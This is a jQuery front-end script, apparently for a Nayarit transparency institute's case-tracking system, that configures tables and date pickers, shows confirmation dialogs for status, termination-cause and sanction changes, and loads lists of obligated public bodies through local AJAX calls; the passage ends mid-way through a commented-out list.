var toogle = true;
var select = $('#Terminado');

/*================================================================================
				=            SLIDEBAR MENU           =
===============================================================================*/

$('.sidebar-menu').tree();

/*============================================================================= 
				=            SLIDEBAR MENU           =
==============================================================================*/

   $(".tablas").DataTable({
   
   "scrollY": 450,
   "scrollX": true,  
   "language": {

    "sProcessing":     "Procesando...",
    "sLengthMenu":     "Mostrar _MENU_ registros",
    "sZeroRecords":    "No se encontraron resultados",
    "sEmptyTable":     "Ningún dato disponible en esta tabla",
    "sInfo":           "Mostrando registros del _START_ al _END_ de un total de _TOTAL_",
    "sInfoEmpty":      "Mostrando registros del 0 al 0 de un total de 0",
    "sInfoFiltered":   "(filtrado de un total de _MAX_ registros)",
    "sInfoPostFix":    "",
    "sSearch":         "Buscar:",
    "sUrl":            "",
    "sInfoThousands":  ",",
    "sLoadingRecords": "Cargando...",
    "oPaginate": {
    "sFirst":    "Primero",
    "sLast":     "Último",
    "sNext":     "Siguiente",
    "sPrevious": "Anterior"
    },
    "oAria": {
      "sSortAscending":  ": Activar para ordenar la columna de manera ascendente",
      "sSortDescending": ": Activar para ordenar la columna de manera descendente"
    },  

  }

});






/*===================================================================================
					=            DATE PICKER           =
===================================================================================*/

    $('#datepicker').datepicker({
      autoclose: true,
      format: 'yyyy/mm/dd',
      locale: 'es'


    });

    $('#datepicker2').datepicker({
      autoclose: true,
      format: 'yyyy/mm/dd',
      locale: 'es'
    });

    $('#datepicker3').datepicker({
      autoclose: true,
      format: 'yyyy/mm/dd',
      locale: 'es'
    });

    $('#datePickerActualizar').datepicker({
      autoclose: true,
      format: 'yyyy/mm/dd',
      locale: 'es'
    });

     $('#datePickerActualizar2').datepicker({
      autoclose: true,
      format: 'yyyy/mm/dd',
      locale: 'es'
    });

     $('#datePickerActualizar3').datepicker({
      autoclose: true,
      format: 'yyyy/mm/dd',
      locale: 'es'
    });

     $('#datePickerActualizarAcuse').datepicker({
      autoclose: true,
      format: 'yyyy/mm/dd',
      locale: 'es'
    }); 

    $('#datePickerAcuerdo1').datepicker({
      autoclose: true,
      format: 'yyyy/mm/dd',
      locale: 'es'
    });

    $('#datePickerAcuerdo2').datepicker({
      autoclose: true,
      format: 'yyyy/mm/dd',
      locale: 'es'
		});
		
		$('#datePickerAcuerdo3').datepicker({
      autoclose: true,
      format: 'yyyy/mm/dd',
      locale: 'es'
		}); 
		
		$('#datePickerAcuerdo4').datepicker({
      autoclose: true,
      format: 'yyyy/mm/dd',
      locale: 'es'
    }); 


/*====================================================================================
					         =            ESTADO PROCESAL           =
======================================================================================*/

 $(function() {

	$("#Estado_Procesal").change(function(){

			if ($(this).val()==="EstadoProcesal" || $(this).val()==="1" || $(this).val()==="2") {

				/* Mensaje de advertencia */
				swal({

    				title: '¿Esta seguro/a que desea realizar el "Cambio de Estado"',
    				text: "¡Esta accion puede perjudicar la 'Descripcion del Tramite','Fecha de Terminacion' y toda la informacion sobre 'Causa de Terminacion', Si no estas, puede Cancelar la accion! ",
    				type: 'warning',
    				showCancelButton: true,
    				confirmButtonColor: '#3085d6',
    				cancelButtonColor: '#d33',
    				cancelButtonText:'Cancelar',
    				confirmButtonText:'Si, Realizar Cambio de Estado!'

			}).then((result)=>{

  				if(result.value){

      				if ($(this).val()==="EstadoProcesal") {

							EstadoProcesalRegistros();

					}

					if ($(this).val()==="1") {

						Terminado();
						TerminadoRegistros();
						
					}

					if ($(this).val()==="2") {

						Tramites();
						RegistrosTramites();

					}

    					}else if ($(this).val()==="1") {

    							$("#Estado_Procesal").val('EstadoProcesal');

    					} else if ($(this).val()==="2") {

    							$("#Estado_Procesal").val('EstadoProcesal');
    					} 

  				})

			}

		});
	
	})

/*====================================================================================
					=            ESTADO PROCESAL        =

							   - Estado Procesal -
======================================================================================*/

 function EstadoProcesal(){

 $("#Estado_Procesal").change(function(){

			if ($(this).val()==="EstadoProcesal" || $(this).val()==="1" || $(this).val()==="2") {

				/* Mensaje de advertencia */
				swal({

    				title: '¿Esta seguro/a que desea realizar el "Cambio de Estado"',
    				text: "¡Esta accion puede perjudicar la 'Descripcion del Tramite', 'Fecha de Terminacion' y toda la informacion sobre 'Causa de Terminacion', Si no estas, puede Cancelar la accion! ",
    				type: 'warning',
    				showCancelButton: true,
    				confirmButtonColor: '#3085d6',
    				cancelButtonColor: '#d33',
    				cancelButtonText:'Cancelar',
    				confirmButtonText:'Si, Realizar Cambio de Estado!'

			}).then((result)=>{

  				if(result.value){

      				if ($(this).val()==="EstadoProcesal") {

							EstadoProcesalRegistros();

					}

					if ($(this).val()==="1") {

						Terminado();
						TerminadoRegistros();
						
					}

					if ($(this).val()==="2") {

						Tramites();
						RegistrosTramites();

					}

    					}else if ($(this).val()==="1") {

    							$("#Estado_Procesal").val('EstadoProcesal');

    					} else if ($(this).val()==="2") {

    							$("#Estado_Procesal").val('EstadoProcesal');
    					} 

  				})

			}

		});
 }

/*====================================================================================
					=            ESTADO PROCESAL         =

							   	 - Terminado -
======================================================================================*/

function Terminado() {

$("#Estado_Procesal").change(function(){

			if ($(this).val()==="EstadoProcesal" || $(this).val()==="1" || $(this).val()==="2") {

				/* Mensaje de advertencia */
				swal({

    				title: '¿Esta seguro/a que desea realizar el "Cambio de Estado"',
    				text: "¡Esta accion puede perjudicar la 'Descripcion del Tramite', 'Fecha de Terminacion' y toda la informacion sobre 'Causa de Terminacion', Si no estas, puede Cancelar la accion! ",
    				type: 'warning',
    				showCancelButton: true,
    				confirmButtonColor: '#3085d6',
    				cancelButtonColor: '#d33',
    				cancelButtonText:'Cancelar',
    				confirmButtonText:'Si, Realizar Cambio de Estado!'

			}).then((result)=>{

  				if(result.value){


				if ($(this).val()==="1") {
						TerminadoRegistros();
						
					}

				if ($(this).val()==="EstadoProcesal") {

					EstadoProcesal();
					EstadoProcesalRegistros();

				}

				if ($(this).val()==="2") {

					Tramites();
					RegistrosTramites();

				}
    					}else if ($(this).val()==="EstadoProcesal") {

    						$("#Estado_Procesal").val('1');

    					} else if ($(this).val()==="2") {

    						$("#Estado_Procesal").val('1');
    					} 

  				})

			}

		});

}


/*====================================================================================
					=            ESTADO PROCESAL         =

							   	 - En Tramites -
======================================================================================*/


function Tramites() {

$("#Estado_Procesal").change(function(){

			if ($(this).val()==="EstadoProcesal" || $(this).val()==="1" || $(this).val()==="2") {

				/* Mensaje de advertencia */
				swal({

    				title: '¿Esta seguro/a que desea realizar el "Cambio de Estado"',
    				text: "¡Esta accion puede perjudicar la 'Descripcion del Tramite', 'Fecha de Terminacion' y toda la informacion sobre 'Causa de Terminacion', Si no estas, puede Cancelar la accion! ",
    				type: 'warning',
    				showCancelButton: true,
    				confirmButtonColor: '#3085d6',
    				cancelButtonColor: '#d33',
    				cancelButtonText:'Cancelar',
    				confirmButtonText:'Si, Realizar Cambio de Estado!'

			}).then((result)=>{

  				if(result.value){

				if ($(this).val()==="2") {

					RegistrosTramites();

				}  					

					if ($(this).val()==="1") {

						Terminado();
						TerminadoRegistros();
						
					}

					if ($(this).val()==="EstadoProcesal") {

					EstadoProcesal();
					EstadoProcesalRegistros();

					}

    			}else if ($(this).val()==="EstadoProcesal") {

    				$("#Estado_Procesal").val('2');

    			} else if ($(this).val()==="1") {

    				$("#Estado_Procesal").val('2');
    			} 

  			})

		}

	});

}

/*====================================================================================
					=      	"REGISTROS"  ESTADO PROCESAL         =

							- EstadoProcesalRegistros -
							  - TerminadoRegistros -
							  - RegistrosTramites -
======================================================================================*/



function EstadoProcesalRegistros() {

		$("#InformacionSolicitada").prop("disabled", true);
		$("#InformacionSolicitada").val('');
		$("#datepicker3").prop("disabled",true);
		$("#datepicker3").val('');
		$("#CausaTerminacion").prop("disabled",true);
		$("#CausaTerminacion").val('');
		$("#EstadoProcesal").val('');

		if (!toogle) {

			toogle = true;

			$("#contenedor170").slideUp("fast");
			$("#leyes3").val('');
			$("#contenedor171").slideUp("fast");
			$("#leyes4").val('');
						
		}		
}						


function TerminadoRegistros() {

	$("#InformacionSolicitada").prop("disabled", true);
	$("#InformacionSolicitada").val(''); 
    $("#datepicker3").prop("disabled",false);
    $("#CausaTerminacion").prop("disabled",false);
}

function RegistrosTramites(){

	$("#InformacionSolicitada").prop("disabled", false);
	$("#datepicker3").prop("disabled",true);
	$("#datepicker3").val('');
	$("#CausaTerminacion").prop("disabled",true);
	$("#CausaTerminacion").val('');
	 	
	 	if (!toogle) {

			toogle = true;


			$("#contenedor170").slideUp("fast");
			$("#leyes3").val('');
			$("#contenedor171").slideUp("fast");
			$("#leyes4").val('');

		}

}


 /*====================================================================================
					=         CAUSA DE TERMINACION         =
======================================================================================*/

	$(function() {

	$("#CausaTerminacion").change(function(){

			if ($(this).val()==="" || $(this).val()==="1" || $(this).val()==="2" || $(this).val()==="3") {

				/* Mensaje de advertencia */
				swal({

    				title: '¿Esta seguro/a que desea realizar el "Cambio de Causa"?',
    				text: "¡Esta accion puede perjudicar la 'Causa de Terminacion', 'Cumplimientos' y toda la informacion sobre los 'Articulos 170 y 171', Si no lo estas, puede Cancelar la accion! ",
    				type: 'warning',
    				showCancelButton: true,
    				confirmButtonColor: '#3085d6',
    				cancelButtonColor: '#d33',
    				cancelButtonText:'Cancelar',
    				confirmButtonText:'Si, Realizar Cambio de Causa'

			}).then((result)=>{

  				if(result.value){

  					if ($(this).val()==="") {

  						RegistroCausaDeTerminacion();
  					}

  					if ($(this).val()==="1") {

  						CumplimientoDeResolucion();
  						RegistroCumplimientoDeResolucion();
  					}

  					if ($(this).val()==="2") {

  						RegistroDesechado();
  						Desechado();
  					}

  					if ($(this).val()==="3") {

  						Sobreseguido();
  						RegistroSobreseguido();
  					}

      				
    					}else if ($(this).val()==="1") {

    							$("#CausaTerminacion").val('');
    							

    					}else if ($(this).val()==="2") {

    							$("#CausaTerminacion").val('');
    							

    					}else if ($(this).val()==="3") {

    							$("#CausaTerminacion").val('');
    							
    					} 

  				})

			}

		});
	
	})


 /*====================================================================================
					=         CAUSA DE TERMINACION         =

							- Causa de Terminacion
======================================================================================*/

function CausaDeTerminacion() {
	
	$("#CausaTerminacion").change(function(){

		if ($(this).val()==="" || $(this).val()==="1" || $(this).val()==="2" || $(this).val()==="3") {

				/* Mensaje de advertencia */
			swal({

    			title: '¿Esta seguro/a que desea realizar el "Cambio de Causa"?',
    			text: "¡Esta accion puede perjudicar la 'Causa de Terminacion', 'Cumplimientos' y toda la informacion sobre los 'Articulos 170 y 171', Si no lo estas, puede Cancelar la accion! ",
    			type: 'warning',
    			showCancelButton: true,
    			confirmButtonColor: '#3085d6',
    			cancelButtonColor: '#d33',
    			cancelButtonText:'Cancelar',
    			confirmButtonText:'Si, Realizar Cambio de Causa'

		    }).then((result)=>{

  				if(result.value){

  					if ($(this).val()==="") {

  						RegistroCausaDeTerminacion();
  					}

  					if ($(this).val()==="1") {

  						CumplimientoDeResolucion();
  						RegistroCumplimientoDeResolucion();
  					}

  					if ($(this).val()==="2") {

  						Desechado();
  						RegistroDesechado();
  					}

  					if ($(this).val()==="3") {

  						Sobreseguido();
  						RegistroSobreseguido();
  					}

      				
    					}else if ($(this).val()==="1") {

    							$("#CausaTerminacion").val('');
    						

    					}else if ($(this).val()==="2") {

    							$("#CausaTerminacion").val('');
    							

    					}else if ($(this).val()==="3") {

    							$("#CausaTerminacion").val('');
    							
    					} 

  				})

			}

		});
}

 /*====================================================================================
					=         CAUSA DE TERMINACION         =

							- Cumplimiento de Resolucion
======================================================================================*/

function CumplimientoDeResolucion() {

	$("#CausaTerminacion").change(function(){

			if ($(this).val()==="" || $(this).val()==="1" || $(this).val()==="2" || $(this).val()==="3") {

				/* Mensaje de advertencia */
				swal({

    				title: '¿Esta seguro/a que desea realizar el "Cambio de Causa"?',
    				text: "¡Esta accion puede perjudicar la 'Causa de Terminacion', 'Cumplimientos' y toda la informacion sobre los 'Articulos 170 y 171', Si no lo estas, puede Cancelar la accion! ",
    				type: 'warning',
    				showCancelButton: true,
    				confirmButtonColor: '#3085d6',
    				cancelButtonColor: '#d33',
    				cancelButtonText:'Cancelar',
    				confirmButtonText:'Si, Realizar Cambio de Causa'

			}).then((result)=>{

  				if(result.value){

  					if ($(this).val()==="") {

  						CausaDeTerminacion();
  						RegistroCausaDeTerminacion();
  					}

  					if ($(this).val()==="1") {

  						RegistroCumplimientoDeResolucion();
  					}

  					if ($(this).val()==="2") {

  						RegistroDesechado();
  						Desechado();
  					}

  					if ($(this).val()==="3") {

  						Sobreseguido(); 
  						RegistroSobreseguido();
  					}

      				
    					}else if ($(this).val()==="") {

    							$("#CausaTerminacion").val('1');
    							

    					}else if ($(this).val()==="2") {

    							$("#CausaTerminacion").val('1');
    						

    					}else if ($(this).val()==="3") {

    							$("#CausaTerminacion").val('1');
    							
    					} 

  				})

			}

		});


}

 /*====================================================================================
					=         CAUSA DE TERMINACION         =

								- Desechado
======================================================================================*/

function Desechado() {

	$("#CausaTerminacion").change(function(){

			if ($(this).val()==="" || $(this).val()==="1" || $(this).val()==="2" || $(this).val()==="3") {

				/* Mensaje de advertencia */
				swal({

    				title: '¿Esta seguro/a que desea realizar el "Cambio de Causa"?',
    				text: "¡Esta accion puede perjudicar la 'Causa de Terminacion', 'Cumplimientos' y toda la informacion sobre los 'Articulos 170 y 171', Si no lo estas, puede Cancelar la accion! ",
    				type: 'warning',
    				showCancelButton: true,
    				confirmButtonColor: '#3085d6',
    				cancelButtonColor: '#d33',
    				cancelButtonText:'Cancelar',
    				confirmButtonText:'Si, Realizar Cambio de Causa'

			}).then((result)=>{

  				if(result.value){

  					if ($(this).val()==="") {

  						CausaDeTerminacion();
  						RegistroCausaDeTerminacion();
  					}

  					if ($(this).val()==="1") {

  						CumplimientoDeResolucion();
  						RegistroCumplimientoDeResolucion();
  					}

  					if ($(this).val()==="2") {

  						RegistroDesechado();
  					}

  					if ($(this).val()==="3") {

  						Sobreseguido(); 
  						RegistroSobreseguido();
  					}

      				
    					}else if ($(this).val()==="") {

    							$("#CausaTerminacion").val('2');
    							

    					}else if ($(this).val()==="1") {

    							$("#CausaTerminacion").val('2');
    							

    					}else if ($(this).val()==="3") {

    							$("#CausaTerminacion").val('2');
    							
    					} 

  				})

			}

		});

}

 /*====================================================================================
					=         CAUSA DE TERMINACION         =

								- Sobreseido
======================================================================================*/


function Sobreseguido() {

	$("#CausaTerminacion").change(function(){

			if ($(this).val()==="" || $(this).val()==="1" || $(this).val()==="2" || $(this).val()==="3") {

				/* Mensaje de advertencia */
				swal({

    				title: '¿Esta seguro/a que desea realizar el "Cambio de Causa"?',
    				text: "¡Esta accion puede perjudicar la 'Causa de Terminacion', 'Cumplimientos' y toda la informacion sobre los 'Articulos 170 y 171', Si no lo estas, puede Cancelar la accion! ",
    				type: 'warning',
    				showCancelButton: true,
    				confirmButtonColor: '#3085d6',
    				cancelButtonColor: '#d33',
    				cancelButtonText:'Cancelar',
    				confirmButtonText:'Si, Realizar Cambio de Causa'

			}).then((result)=>{

  				if(result.value){

  					if ($(this).val()==="") {

  						CausaDeTerminacion();
  						RegistroCausaDeTerminacion();
  					}

  					if ($(this).val()==="1") {

  						CumplimientoDeResolucion();
  						RegistroCumplimientoDeResolucion();
  					}

  					if ($(this).val()==="2") {

  						Desechado();
  						RegistroDesechado();
  					}

  					if ($(this).val()==="3") {

  						RegistroSobreseguido();
  					}

      				
    					}else if ($(this).val()==="") {

    							$("#CausaTerminacion").val('3');
    							

    					}else if ($(this).val()==="1") {

    							$("#CausaTerminacion").val('3');
    							

    					}else if ($(this).val()==="2") {

    							$("#CausaTerminacion").val('3');
    							
    					} 

  				})

			}

		});

}



 /*====================================================================================
					=        REGISTRO CAUSA DE TERMINACION         =

								- RegistroCausaDeTerminacion
								- RegistroCumplimientoDeResolucion
								- RegistroDesechado
								- RegistroSobreSeguido
======================================================================================*/


 function RegistroCausaDeTerminacion() {

 	if (!toogle) {

		toogle = true;

			$("#contenedor170").slideUp("fast");
			$("#leyes3").val('');
			$("#contenedor171").slideUp("fast");
			$("#leyes4").val('');

		}

 }

 function RegistroCumplimientoDeResolucion() {

 	 if (!toogle) {

		 toogle = true;

			$("#contenedor170").slideUp("fast");
			$("#leyes3").val('');
			$("#contenedor171").slideUp("fast");
			$("#leyes4").val('');

		}
 	
 }


 function RegistroDesechado(){

 	  toogle = false;

	  $("#contenedor170").slideDown("fast");
	  $("#contenedor171").slideUp("fast");
	  $("#leyes4").val('');

 }


 function RegistroSobreseguido() {
 	 toogle = false;

		$("#contenedor170").slideUp("fast");
		$("#leyes3").val('');
		$("#contenedor171").slideDown("fast");

 }


 /*====================================================================================
					=        REGISTRO CAUSA DE TERMINACION         =
======================================================================================*/

$(function() {

	$("#ImposicionSanciones").change(function(){

			if ($(this).val()==="" || $(this).val()==="SI" || $(this).val()==="NO") {

				/* Mensaje de advertencia */
				swal({

    				title: '¿Esta seguro/a que desea realizar el "Cambio de Imposicion"?',
    				text: "¡Esta accion puede perjudicar los 'Datos Personales' y 'Tipo de Sanciones', Si no lo estas, puede Cancelar la accion! ",
    				type: 'warning',
    				showCancelButton: true,
    				confirmButtonColor: '#3085d6',
    				cancelButtonColor: '#d33',
    				cancelButtonText:'Cancelar',
    				confirmButtonText:'Si, Realizar Cambio de Causa'

			}).then((result)=>{

  				if(result.value){


  					if ($(this).val()==="") {

  						RegistroImposicionSanciones();
  						

  					}

  					if ($(this).val()==="SI") {

  						ImposicionSI();
  						RegistroSI();

  						
  					}

  					if ($(this).val()==="NO") {

  						ImposicionNO();
  						RegistroNo();

  					}

      				
    					}else if ($(this).val()==="SI") {

    							$("#ImposicionSanciones").val('');
    							

    					}else if ($(this).val()==="NO") {

    							$("#ImposicionSanciones").val('');
    							

    					}

  				})

			}

		});
	
	})

/*====================================================================================
					=        REGISTRO CAUSA DE TERMINACION         =
						
							- Imposicion de Sanciones -

======================================================================================*/

function ImposicionDeSanciones() {

	$("#ImposicionSanciones").change(function(){

			if ($(this).val()==="" || $(this).val()==="SI" || $(this).val()==="NO") {

				/* Mensaje de advertencia */
				swal({

    				title: '¿Esta seguro/a que desea realizar el "Cambio de Imposicion"?',
    				text: "¡Esta accion puede perjudicar los 'Datos Personales' y 'Tipo de Sanciones', Si no lo estas, puede Cancelar la accion! ",
    				type: 'warning',
    				showCancelButton: true,
    				confirmButtonColor: '#3085d6',
    				cancelButtonColor: '#d33',
    				cancelButtonText:'Cancelar',
    				confirmButtonText:'Si, Realizar Cambio de Causa'

			}).then((result)=>{

  				if(result.value){

  					if ($(this).val()==="") {

  						RegistroImposicionSanciones();
  					}

  					if ($(this).val()==="SI") {

  						ImposicionSI();
  						RegistroSI();

  						
  					}

  					if ($(this).val()==="NO") {

  						ImposicionNO();
  						RegistroNo();

  					}
      				
    					}else if ($(this).val()==="SI") {

    							$("#ImposicionSanciones").val('');
    							

    					}else if ($(this).val()==="NO") {

    							$("#ImposicionSanciones").val('');
    							

    					}

  				})

			}

		});

	
}


/*====================================================================================
					=        REGISTRO CAUSA DE TERMINACION         =
						
										- SI -

======================================================================================*/

function ImposicionSI() {
	
	$("#ImposicionSanciones").change(function(){

			if ($(this).val()==="" || $(this).val()==="SI" || $(this).val()==="NO") {

				/* Mensaje de advertencia */
				swal({

    				title: '¿Esta seguro/a que desea realizar el "Cambio de Imposicion"?',
    				text: "¡Esta accion puede perjudicar los 'Datos Personales' y 'Tipo de Sanciones', Si no lo estas, puede Cancelar la accion! ",
    				type: 'warning',
    				showCancelButton: true,
    				confirmButtonColor: '#3085d6',
    				cancelButtonColor: '#d33',
    				cancelButtonText:'Cancelar',
    				confirmButtonText:'Si, Realizar Cambio de Causa'

			}).then((result)=>{

  				if(result.value){

  					if ($(this).val()==="") {

  						ImposicionDeSanciones();
  						RegistroImposicionSanciones();
  					}

  					if ($(this).val()==="SI") {

  						RegistroSI();
  					}

  					if ($(this).val()==="NO") {

  						ImposicionNO();
  						RegistroNo();

  					}
  							
    					}else if ($(this).val()==="") {

    							$("#ImposicionSanciones").val('SI');
    							

    					}else if ($(this).val()==="NO") {

    							$("#ImposicionSanciones").val('SI');
    							

    					}

  				})

			}

		});
	
}

/*====================================================================================
					=        REGISTRO CAUSA DE TERMINACION         =
						
										- NO -

======================================================================================*/

function ImposicionNO() {

	$("#ImposicionSanciones").change(function(){

			if ($(this).val()==="" || $(this).val()==="SI" || $(this).val()==="NO") {

				/* Mensaje de advertencia */
				swal({

    				title: '¿Esta seguro/a que desea realizar el "Cambio de Imposicion"?',
    				text: "¡Esta accion puede perjudicar los 'Datos Personales' y 'Tipo de Sanciones', Si no lo estas, puede Cancelar la accion! ",
    				type: 'warning',
    				showCancelButton: true,
    				confirmButtonColor: '#3085d6',
    				cancelButtonColor: '#d33',
    				cancelButtonText:'Cancelar',
    				confirmButtonText:'Si, Realizar Cambio de Causa'

			}).then((result)=>{

  				if(result.value){


  					if ($(this).val()==="") {

  						ImposicionDeSanciones();
  						RegistroImposicionSanciones();
  					}

  					if ($(this).val()==="SI") {

  						RegistroSI();
  						ImposicionSI();
  					}

  					if ($(this).val()==="NO") {

  						RegistroNo();

  					}
  							

      				
    					}else if ($(this).val()==="SI") {

    							$("#ImposicionSanciones").val('NO');
    							

    					}else if ($(this).val()==="") {

    							$("#ImposicionSanciones").val('NO');
    							

    					}

  				})

			}

		});
	
}


/*===========================================================================
				 =     REGISTROS IMPOSICION DE SANCIONES         =
=============================================================================*/

	function RegistroImposicionSanciones() {
		
	        $("#Nombres").val('');
			$("#Apellidos").val('');
			$("#TipoImposicionSanciones").val('');
			$("#Monto").val('');
			$("#TipoAmonestaciones").val('');

		if (!toogle) {

		  toogle = true;

			$("#DatosPersonales").slideUp("fast");

			$("#SancionesSi").slideUp("fast");	

		}
	
	}

	function RegistroSI() {

		toogle = false;

		  	$("#DatosPersonales").slideDown("fast");

		  	$("#Monto").prop("disabled",true);
			$("#TipoAmonestaciones").prop("disabled",true);

			$("#SancionesSi").slideDown("fast");
	
	}

	function RegistroNo() {

	        $("#Nombres").val('');
			$("#Apellidos").val('');
			$("#TipoImposicionSanciones").val('');
			$("#Monto").val('');
			$("#TipoAmonestaciones").val('');

		if (!toogle) {

			toogle = true;

			$("#DatosPersonales").slideUp("fast");

			$("#SancionesSi").slideUp("fast");

			

		}
	
	}


/*===========================================================================
				=    TIPO DE SANCIONES ( MULTA - AMONESTACIONES )      =
=============================================================================*/

$(function() {

$("#TipoImposicionSanciones").change(function(){

	if ($(this).val()==="") {

			$("#Monto").prop("disabled",true);
			$("#TipoAmonestaciones").prop("disabled",true);

		}

	if ($(this).val()==="Multa") {

			$("#Monto").prop("disabled",false);
			$("#TipoAmonestaciones").prop("disabled",true);
		}

	if ($(this).val()==="Amonestaciones") {

			$("#TipoAmonestaciones").prop("disabled",false);
			$("#Monto").prop("disabled",true);
		}


	})

})


/*=============================================
ESCONDER SLIDE
=============================================*/

$("#btnSlide").click(function(){

  if(!toogle){

    toogle = true;

    $("#slide").slideUp("fast");

    $("#btnSlide").html('<i class="fa fa-angle-down"></i>')
  
  }else{

    toogle = false;

    $("#slide").slideDown("fast");

    $("#btnSlide").html('<i class="fa fa-angle-up"></i>')
  }

})

/*===========================================================================
                    =    TIPO DE SUJETO OBLIGADO     =
=============================================================================*/
  $(document).ready(function(){
		
	$('#nuevoTipoSujetoObligado').val(0);
	recargarLista();

	$('#nuevoTipoSujetoObligado').change(function(){
		recargarLista();
	});
})

function recargarLista(){
	$.ajax({
		type:"POST",
		url:"ajax/sujetos.ajax.php",
		data:"sujetos=" + $('#nuevoTipoSujetoObligado').val(),
		success:function(r){
			$('#select2lista').html(r);
		}
	});
} 

/*===========================================================================
                      =    TIPO DE SUJETO OBLIGADO     =
  =============================================================================*/
  
  $(document).ready(function(){
		
	$('#ActualizarTipoSujetoObligadoAjax').val(0);
	recargarLista2();

	$('#ActualizarTipoSujetoObligadoAjax').change(function(){
		recargarLista2();
	});
})

function recargarLista2(){
	$.ajax({
		type:"POST",
		url:"ajax/sujetoa.ajax.php",
		data:"sujetos=" + $('#ActualizarTipoSujetoObligadoAjax').val(),
		success:function(r){
			$('#select2lista2').html(r);
		}
	});
}
  
/*

  function cargarTipoDeSujetoObligado() {
    var array = ["Ayuntamientos", "Partidos Politicos", "Ejecutivos", "Poderes", "Autonomos","Sindicatos","Personas Morales"];
    //array.sort();
    addOptions("nuevoTipoSujetoObligado", array);
}

	//Función para agregar opciones a un <select>.
function addOptions(domElement, array) {
    var selector = document.getElementsByName(domElement)[0];
    for (nuevoTipoSujetoObligado in array) {
        var opcion = document.createElement("option");
        opcion.text = array[nuevoTipoSujetoObligado];
        // Añadimos un value a los option para hacer mas facil escoger los pueblos
        opcion.value = array[nuevoTipoSujetoObligado].toLowerCase()
        selector.add(opcion);
    }
}


function cargarSujetoObligados() {
    // Objeto de provincias con pueblos
    var listaSujetosObligados = {

      ayuntamientos: ["Acaponeta Ayuntamiento", "Acaponeta DIF", "Acaponeta OOMAPAS", 
                      "Ahuacatlan Ayuntamiento", "Ahuacatlan DIF", "Ahuacatlan OOAPA", 
                      "Amatlan de Cañas Ayuntamiento",  "Amatlan de Cañas DIF",  "Amatlan de Cañas OROMAPAS",
                      "Bahia de Banderas Ayuntamiento", "Bahia de Banderas DIF ", "Bahia de Banderas OROMAPAS", "Bahia de Banderas IMPLAN",
                      "Compostela Ayuntamiento", "Compostela DIF ", "Compostela SIAPA",
                      "El nayar Ayuntamiento", "El nayar DIF", "El nayar OROMAPAS",
                      "Huajicori Ayuntamiento", "Huajicori DIF ", "Huajicori OROAPA",
                      "Ixtlan del Rio Ayuntamiento", "Ixtlan del Rio DIF ", "Ixtlan del Rio OOMAPASI",
                      "Jala Ayuntamiento", "Jala DIF ", "Jala SIAPA",
                      "La Yesca Ayuntamiento", "La Yesca DIF ", "La Yesca OROMAPAS",
                      "Rosamorada Ayuntamiento", "Rosamorada DIF ", "Rosamorada OROMAPAS",
                      "Ruiz Ayuntamiento", "Ruiz DIF ", "Ruiz OROMAPASR",
                      "San blas Ayuntamiento", "San blas DIF ", "San blas OROMAPAS",
                      "Santiago Ixcuintla Ayuntamiento", "Santiago Ixcuintla DIF ", "Santiago Ixcuintla OOMAPAS",
                      "San Pedro Laguinillas Ayuntamiento", "San Pedro Laguinillas DIF ", "San Pedro Laguinillas OROMAPAS",
                      "Santa Maria del Oro Ayuntamiento", "Santa Maria del Oro DIF ", "Santa Maria del Oro SIAPA",
                      "Tecuala Ayuntamiento", "Tecuala DIF ", "Tecuala OROMAPAS",
                      "Tepic Ayuntamiento", "Tepic DIF", "Tepic IMPLAN", "Tepic Comision Mpal de Derechos Humanos",
                      "Tuxpan Ayuntamiento", "Tuxpan DIF ", "Tuxpan OROAPAS",
                      "Xalisco Ayuntamiento","Xalisco DIF ","Xalisco OROMAPAS"
                      ],

      'partidos politicos': ["Partido Acción Nacional", "Partido Revolucionario Institucional", "Partido de la Revolución Democrática",
                             "Partido Verde Ecologista de México", "Movimiento Ciudadano", "Nueva Alianza", 
                             "Movimiento Regeneración Nacional", "Encuentro Social", "Partido del Trabajo"],
      
      ejecutivos: ["=== DEPENDENCIAS ===", 
                   "Despacho del Ejecutivo/  Coordinador","Secretaría General de Gobierno","Fiscalía General",
                   "Secretaría de Planeación, Programación y Presupuesto","Secretaría de Educación","Secretaría de la Contraloría General",
                   "Secretaría de Turismo","Secretaría de Obras Públicas","Secretaría de Administración y Finanzas",
                   "Secretaria de Seguridad Pública","Servicios de Salud de Nayarit","Secretaría del Trabajo, Productividad y Desarrollo Económico",
                   "Secretaría de Desarrollo Rural y Medio Ambiente","Secretaria de Desarrollo Social",
                   "=== ENTIDADES ===",
                   "Servicios de Educación Pública del Estado de Nayarit","Comisión Estatal de Agua Potable del Estado","Instituto Nayarita de Educación para Adultos",
                   "Instituto Contra las Adicciones 'Marakame'","Universidad Tecnológica de la Costa","Universidad Tecnológica de Bahía de Banderas",
                   "Universidad Tecnológica de Nayarit","Colegio de Educación Profesional Técnica del Estado de Nayarit","Comité de Planeación para el Estado de Nayarit",
                   "Consejo de Ciencia y Tecnología del Estado de Nayarit","Consejo Estatal Contra las Adicciones","Fideicomiso de Bahía de Banderas",
                   "Instituto de Capacitación para el Trabajo en el Estado de Nayarit","Instituto Nayarita de la Juventud","Instituto para la Mujer Nayarita",
                   "Instituto Promotor de la Vivienda de Nayarit","Patronato del Teatro del Pueblo","Instituto Nayarita de Cultura Física y Deporte",
                   "Sistema Estatal de Seguridad Pública","Comisión Estatal de Conciliación y Arbitraje Médico","Colegio de Bachilleres para el Estado de Nayarit COBAEN",
                   "Patronato de la UAN","Sistema Estatal para el Desarrollo Integral de la Familia","Centro de Justicia Familiar",
                   "Colegio de Estudios Científicos y Tecnológicos del Estado de Nayarit","Fideicomiso de Promoción Turística del Estado de Nayarit","Universidad Tecnológica de la Sierra"],

      poderes: ["H. Congreso del Estado de Nayarit", "Auditoria Superior del Estado de Nayarit", "Poder Judicial del Estado de Nayarit"],

      autonomos: ["Universidad Autónoma de Nayarit", "Instituto Estatal Electoral", 
                  "Instituto de Transparencia y Acceso a la Información Pública del Estado", "Comisión de Defensa de los Derechos Humanos para el Estado de Nayarit",
                   "Tribunal Estatal Electoral","Tribunal de Justicia Administrativa del Estado de Nayarit"],

      sindicatos: ["(SITTEP) Sindicato de Trabajadores del Teatro del Pueblo",
                   "(S.U.T.S.E.M.) Sindicato único de Trabajadores al Servicio del Estado, Municipios e Instituciones Descentralizadas de Carácter Estatal.", 
                   "(S.I.T.R.A.P.E.N.) Sindicato de Trabajadores del Poder Ejecutivo de Nayarit.", 
                   "(S.I.T.E.M.) Sindicato de Trabajadores al Servicio de los Poderes del Estado, Municipios y Organismos Descentralizados en Nayarit.", 
